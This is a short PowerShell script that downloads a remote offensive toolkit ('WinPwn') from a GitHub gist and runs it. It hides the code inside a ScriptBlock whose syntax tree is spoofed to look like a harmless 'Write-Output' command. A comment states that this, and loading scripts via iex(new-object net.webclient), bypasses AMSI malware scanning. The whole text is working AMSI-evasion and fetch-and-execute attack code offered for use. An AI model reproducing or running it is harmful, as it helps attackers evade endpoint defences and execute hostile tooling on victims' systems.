$c = (new-Object net.webclient).downloadstring('https://gist.githubusercontent.com/S3cur3Th1sSh1t/2f4d37fde889af8f02b287db84f8ec4b/raw/0e2823c209fb7ca85f1aa3d0a0ab9c7871ef97bd/winpwn.ps1')
$SpoofedAst = [ScriptBlock]::Create("Write-Output 'Hello'").Ast  
$ExecutedAst = [ScriptBlock]::Create("$c").Ast
$Ast = [System.Management.Automation.Language.ScriptBlockAst]::new($SpoofedAst.Extent,
                                                                   $null,
                                                                   $null,
                                                                   $null,
                                                                   $ExecutedAst.EndBlock.Copy(),
                                                                   $null)
$Sb = $Ast.GetScriptBlock()
# Any function - such as in this case WinPwn - that you want to be executed must be already called in the Scriptblock on the remote webserver. Fun fact, scripts that are loaded by the Script itself via iex(new-object net.webclient) also bypass AMSI.
& $Sb
